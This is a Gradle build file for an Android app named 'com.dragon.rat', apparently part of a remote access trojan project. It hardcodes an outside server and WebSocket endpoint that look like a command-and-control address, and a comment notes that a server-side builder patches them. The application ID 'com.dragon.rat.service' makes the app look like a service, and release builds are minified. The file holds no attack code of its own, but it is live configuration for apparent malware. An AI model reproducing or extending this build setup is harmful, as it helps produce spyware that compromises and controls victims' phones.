plugins {
    id("com.android.application")
}

android {
    namespace = "com.dragon.rat"
    compileSdk = 34
    buildToolsVersion = "34.0.0"

    defaultConfig {
        applicationId = "com.dragon.rat.service"
        minSdk = 23
        targetSdk = 34
        versionCode = 1
        versionName = "3.0.0"

        // This gets patched by server-side builder
        buildConfigField("String", "SERVER_URL", "\"https://dragon-rat.onrender.com\"")
        buildConfigField("String", "WS_URL", "\"wss://dragon-rat.onrender.com/ws\"")
    }

    buildTypes {
        release {
            isMinifyEnabled = true
            isShrinkResources = true
            proguardFiles(
                getDefaultProguardFile("proguard-android-optimize.txt"),
                "proguard-rules.pro"
            )
        }
        debug {
            isMinifyEnabled = false
        }
    }

    compileOptions {
        sourceCompatibility = JavaVersion.VERSION_17
        targetCompatibility = JavaVersion.VERSION_17
    }

    packaging {
        resources {
            excludes += "/META-INF/{AL2.0,LGPL2.1}"
        }
    }
}

dependencies {
    // WebSocket client (pure Java, no Google Play dependency)
    implementation("org.java-websocket:Java-WebSocket:1.5.6")
    
    // JSON parsing
    implementation("com.google.code.gson:gson:2.10.1")

    // AndroidX
    implementation("androidx.core:core:1.12.0")
    implementation("androidx.appcompat:appcompat:1.6.1")
}
